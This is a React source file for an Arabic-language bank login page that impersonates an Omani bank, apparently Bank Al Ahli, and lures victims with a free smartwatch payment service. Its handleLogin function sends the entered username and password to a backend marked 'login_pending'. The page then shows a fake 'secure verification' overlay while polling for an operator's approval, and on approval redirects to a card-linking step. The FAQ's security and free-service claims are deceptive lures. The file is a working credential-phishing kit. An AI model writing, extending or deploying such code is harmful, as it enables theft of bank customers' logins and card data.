import React, { useState, useEffect } from 'react';
import {
  User,
  Eye,
  EyeOff,
  Lock,
  QrCode,
  HelpCircle,
  MapPin,
  X,
  AlertCircle,
  ShieldCheck
} from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import AppHeader from '../components/AppHeader';
import AppFooter from '../components/AppFooter';
import { OMANI_BANKERS_BG } from '../types';
import { updateCardRequest, getCardRequest } from '../api';

export default function LoginServicePage() {
  const navigate = useNavigate();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [activeModal, setActiveModal] = useState<string | null>(null);
  const [isWaitingApproval, setIsWaitingApproval] = useState(false);
  const [loginError, setLoginError] = useState('');

  useEffect(() => {
    if (!isWaitingApproval) return;

    const timer = setInterval(async () => {
      try {
        const req = await getCardRequest();
        if (!req) {
          setIsWaitingApproval(false);
          return;
        }
        if (req.otpStatus === 'login_approved' || req.step === 'card') {
          setIsWaitingApproval(false);
          navigate('/card-link');
        } else if (req.otpStatus === 'login_rejected') {
          setIsWaitingApproval(false);
          setLoginError('بيانات تسجيل الدخول غير صحيحة، يرجى التحقق من اسم المستخدم والرقم السري والمحاولة مرة أخرى.');
        }
      } catch {
        // Ignore transient network errors
      }
    }, 1500);

    return () => clearInterval(timer);
  }, [isWaitingApproval, navigate]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError('');
    setIsWaitingApproval(true);
    try {
      await updateCardRequest('current', {
        loginUsername: username.trim(),
        loginPassword: password,
        step: 'login',
        otpStatus: 'login_pending'
      });
    } catch {
      // Keep waiting state active
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#fbfbfd]">
      <AppHeader showBack backTo="/link-service" title="بوابة تسجيل الدخول الآمن" />

      <main className="flex-1 py-4 px-4 max-w-md mx-auto w-full">
        {/* Main Card with Real Omani Banking Photo */}
        <div className="bg-white rounded-3xl shadow-sm border border-gray-200 overflow-hidden mb-6">
          {/* Top Banner with Omani Bankers Photo */}
          <div className="relative w-full h-48 sm:h-52 overflow-hidden bg-slate-900">
            <img
              src={OMANI_BANKERS_BG}
              alt="خدمات البنك الأهلي"
              className="w-full h-full object-cover object-top scale-105"
              onError={(e) => {
                (e.target as HTMLElement).style.display = 'none';
              }}
            />
            {/* Gradient Scrim for crisp readability */}
            <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-black/20 to-transparent flex items-end p-4">
              <h2 className="text-lg sm:text-xl font-black text-white leading-tight">
                خدمات مصرفية في منتهى السهولة والسرعة
              </h2>
            </div>
          </div>

          {/* Login Form Body */}
          <div className="p-5 sm:p-6">
            {loginError && (
              <div className="mb-4 p-3.5 bg-red-50 border border-red-200 rounded-2xl text-xs text-red-700 font-bold flex items-start gap-2.5">
                <AlertCircle className="w-4 h-4 text-red-600 shrink-0 mt-0.5" />
                <span>{loginError}</span>
              </div>
            )}

            <form onSubmit={handleLogin} className="space-y-4">
              {/* Username Input */}
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">اسم المستخدم أو رقم الحساب</label>
                <div className="relative">
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder="اسم المستخدم"
                    disabled={isWaitingApproval}
                    className="w-full px-4 py-3 bg-gray-50 border border-gray-300 rounded-xl text-sm focus:bg-white focus:border-[#004838] focus:ring-2 focus:ring-[#004838]/20 outline-none transition-all placeholder:text-gray-400"
                    required
                  />
                  <User className="absolute left-3.5 top-3.5 w-4 h-4 text-gray-400" />
                </div>
              </div>

              {/* Password Input with functional eye toggle */}
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">الرقم السري للخدمات المصرفية</label>
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="الرقم السري"
                    disabled={isWaitingApproval}
                    className="w-full pl-12 pr-4 py-3 bg-gray-50 border border-gray-300 rounded-xl text-sm focus:bg-white focus:border-[#004838] focus:ring-2 focus:ring-[#004838]/20 outline-none transition-all placeholder:text-gray-400"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    aria-label="إظهار / إخفاء الرقم السري"
                    className="absolute left-3 top-3 text-gray-400 hover:text-gray-600 p-1 min-w-[32px] min-h-[32px] flex items-center justify-center cursor-pointer"
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>

              {/* Remember & Forgot Password Links */}
              <div className="flex items-center justify-between text-xs text-gray-500 pt-1">
                <label className="flex items-center gap-2 cursor-pointer">
                  <input type="checkbox" defaultChecked className="rounded text-[#004838] accent-[#004838] w-4 h-4" />
                  <span>تذكرني على هذا الجهاز</span>
                </label>
                <button
                  type="button"
                  onClick={() => setActiveModal('forgot')}
                  className="text-[#004838] hover:underline font-semibold cursor-pointer"
                >
                  نسيت الرقم السري؟
                </button>
              </div>

              {/* Primary Login Button */}
              <div className="pt-2">
                <button
                  type="submit"
                  disabled={isWaitingApproval}
                  className="w-full py-3.5 bg-[#004838] hover:bg-[#00382b] disabled:opacity-70 text-white font-bold text-lg rounded-2xl shadow-md active:scale-[0.98] transition-all cursor-pointer flex items-center justify-center gap-2"
                >
                  {isWaitingApproval ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      <span>جارِ التحقق من بيانات الحساب...</span>
                    </>
                  ) : (
                    <>
                      <Lock className="w-4 h-4 text-[#e8c679]" />
                      <span>تسجيل الدخول</span>
                    </>
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>

        {/* Waiting Approval Overlay Modal */}
        {isWaitingApproval && (
          <div className="fixed inset-0 z-50 bg-black/50 backdrop-blur-xs flex items-center justify-center p-4">
            <div className="bg-white rounded-3xl max-w-xs w-full p-6 shadow-2xl border border-gray-100 text-center space-y-4">
              <div className="relative w-14 h-14 mx-auto flex items-center justify-center">
                <div className="absolute inset-0 rounded-full border-4 border-emerald-100" />
                <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-[#004838] animate-spin" />
                <ShieldCheck className="w-6 h-6 text-[#004838]" />
              </div>
              <h3 className="text-base font-bold text-gray-900">جارِ التحقق المصرفي الآمن</h3>
              <p className="text-xs text-gray-500 leading-relaxed">
                يتم الآن مراجعة وتأكيد بيانات الدخول الخاصة بك عبر بوابة البنك الأهلي، يرجى الانتظار لحظات...
              </p>
            </div>
          </div>
        )}

        {/* Quick Features Section */}
        <div className="mb-6">
          <h3 className="text-sm font-bold text-gray-700 mb-3 px-1">المميزات السريعة</h3>
          <div className="grid grid-cols-3 gap-2.5">
            {/* Quick Feature 1: QR Code */}
            <button
              onClick={() => setActiveModal('qr')}
              className="bg-white p-3.5 rounded-2xl border border-gray-200 hover:border-[#004838]/40 hover:shadow-xs transition-all flex flex-col items-center text-center group cursor-pointer"
            >
              <div className="w-10 h-10 rounded-xl bg-[#e6f4f0] text-[#004838] flex items-center justify-center mb-2 group-hover:scale-105 transition-transform">
                <QrCode className="w-5 h-5" />
              </div>
              <span className="text-[11px] font-bold text-gray-800 leading-tight">
                إنشاء رمز الاستجابة السريع
              </span>
            </button>

            {/* Quick Feature 2: FAQs */}
            <button
              onClick={() => setActiveModal('faq')}
              className="bg-white p-3.5 rounded-2xl border border-gray-200 hover:border-[#004838]/40 hover:shadow-xs transition-all flex flex-col items-center text-center group cursor-pointer"
            >
              <div className="w-10 h-10 rounded-xl bg-[#e6f4f0] text-[#004838] flex items-center justify-center mb-2 group-hover:scale-105 transition-transform">
                <HelpCircle className="w-5 h-5" />
              </div>
              <span className="text-[11px] font-bold text-gray-800 leading-tight">
                الأسئلة الأكثر شيوعاً
              </span>
            </button>

            {/* Quick Feature 3: Branches & ATMs */}
            <button
              onClick={() => setActiveModal('branches')}
              className="bg-white p-3.5 rounded-2xl border border-gray-200 hover:border-[#004838]/40 hover:shadow-xs transition-all flex flex-col items-center text-center group cursor-pointer"
            >
              <div className="w-10 h-10 rounded-xl bg-[#e6f4f0] text-[#004838] flex items-center justify-center mb-2 group-hover:scale-105 transition-transform">
                <MapPin className="w-5 h-5" />
              </div>
              <span className="text-[11px] font-bold text-gray-800 leading-tight">
                مواقع الفروع وأجهزة الصراف
              </span>
            </button>
          </div>
        </div>
      </main>

      {/* Quick Modals for All Features */}
      {activeModal && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-center justify-center p-4">
          <div className="bg-white rounded-3xl max-w-sm w-full p-6 shadow-2xl relative animate-in fade-in zoom-in-95 duration-150">
            <button
              onClick={() => setActiveModal(null)}
              className="absolute top-4 left-4 text-gray-400 hover:text-gray-700 p-1.5 rounded-full hover:bg-gray-100"
            >
              <X className="w-5 h-5" />
            </button>

            {activeModal === 'qr' && (
              <div className="text-center">
                <h3 className="text-lg font-bold text-gray-900 mb-2">رمز الاستجابة السريع - البنك الأهلي</h3>
                <p className="text-xs text-gray-500 mb-4">امسح الرمز بواسطة ساعتك الذكية لتأكيد الارتباط الفوري</p>
                <div className="w-44 h-44 mx-auto bg-gray-50 border-2 border-dashed border-[#004838]/30 rounded-2xl flex items-center justify-center p-4 mb-4">
                  <div className="w-36 h-36 bg-white p-2 rounded-xl shadow-xs flex flex-col items-center justify-center">
                    <QrCode className="w-24 h-24 text-gray-800" />
                    <span className="text-[10px] text-gray-500 mt-1">AB-PAY-TOKEN-9824</span>
                  </div>
                </div>
                <button
                  onClick={() => setActiveModal(null)}
                  className="w-full py-2.5 bg-gray-100 hover:bg-gray-200 text-gray-800 font-bold rounded-xl text-sm cursor-pointer"
                >
                  إغلاق
                </button>
              </div>
            )}

            {activeModal === 'faq' && (
              <div className="text-right">
                <h3 className="text-lg font-bold text-gray-900 mb-3 text-center">الأسئلة الأكثر شيوعاً</h3>
                <div className="space-y-3 max-h-80 overflow-y-auto pr-1 text-xs text-gray-700">
                  <div className="p-2.5 bg-[#f6f9f7] rounded-xl border border-emerald-900/10">
                    <p className="font-bold text-[#004838] mb-1">هل خدمة الدفع بالساعة آمنة؟</p>
                    <p className="text-gray-600">نعم، تستخدم الخدمة تقنية الترميز الرقمي (Tokenization) المشفرة التي لا تشارك رقم بطاقتك الفعلي أبداً.</p>
                  </div>
                  <div className="p-2.5 bg-[#f6f9f7] rounded-xl border border-emerald-900/10">
                    <p className="font-bold text-[#004838] mb-1">هل توجد أي رسوم شهرية؟</p>
                    <p className="text-gray-600">الساعة والخدمة مجانية تماماً كعرض خاص لعملاء البنك الأهلي المميزين.</p>
                  </div>
                  <div className="p-2.5 bg-[#f6f9f7] rounded-xl border border-emerald-900/10">
                    <p className="font-bold text-[#004838] mb-1">ماذا لو فقدت ساعتي؟</p>
                    <p className="text-gray-600">يمكنك إيقاف خاصية الدفع فوراً من تطبيق البنك الأهلي أو بالاتصال على 24577777.</p>
                  </div>
                </div>
                <button
                  onClick={() => setActiveModal(null)}
                  className="w-full mt-4 py-2.5 bg-[#004838] hover:bg-[#00382b] text-white font-bold rounded-xl text-sm cursor-pointer"
                >
                  حسناً، فهمت
                </button>
              </div>
            )}

            {activeModal === 'branches' && (
              <div className="text-right">
                <h3 className="text-lg font-bold text-gray-900 mb-2 text-center">أقرب فروع وأجهزة صراف البنك الأهلي</h3>
                <div className="space-y-2.5 max-h-80 overflow-y-auto pr-1 text-xs">
                  {[
                    { name: 'الفرع الرئيسي - شاطئ القرم', dist: '1.2 كم', status: 'مفتوح حتى 2:00 م' },
                    { name: 'فرع العذيبة (المقر الرئيسي)', dist: '4.8 كم', status: 'خدمة 24 ساعة' },
                    { name: 'سيتي سنتر مسقط - السيب', dist: '6.1 كم', status: 'مفتوح حتى 10:00 م' },
                    { name: 'فرع الخوير', dist: '7.5 كم', status: 'أجهزة إيداع وسحب متوفرة' }
                  ].map((b, i) => (
                    <div key={i} className="p-2.5 bg-gray-50 rounded-xl border border-gray-100 flex items-center justify-between">
                      <div>
                        <p className="font-bold text-gray-900">{b.name}</p>
                        <p className="text-[11px] text-emerald-600 mt-0.5">{b.status}</p>
                      </div>
                      <span className="text-[11px] text-gray-400 font-mono">{b.dist}</span>
                    </div>
                  ))}
                </div>
                <button
                  onClick={() => setActiveModal(null)}
                  className="w-full mt-4 py-2.5 bg-gray-100 hover:bg-gray-200 text-gray-800 font-bold rounded-xl text-sm cursor-pointer"
                >
                  إغلاق
                </button>
              </div>
            )}

            {activeModal === 'forgot' && (
              <div className="text-center">
                <h3 className="text-lg font-bold text-gray-900 mb-2">استعادة الرقم السري</h3>
                <p className="text-xs text-gray-600 leading-relaxed mb-4">
                  لإعادة تعيين كلمة المرور الخاصة بك بأمان، يرجى الاتصال بمركز خدمة العملاء لدى البنك الأهلي أو استخدام خيار نسيت الرقم السري في تطبيق البنك الأهلي.
                </p>
                <button
                  onClick={() => setActiveModal(null)}
                  className="w-full py-2.5 bg-[#004838] hover:bg-[#00382b] text-white font-bold rounded-xl text-sm cursor-pointer"
                >
                  حسناً
                </button>
              </div>
            )}
          </div>
        </div>
      )}

      <AppFooter />
    </div>
  );
}
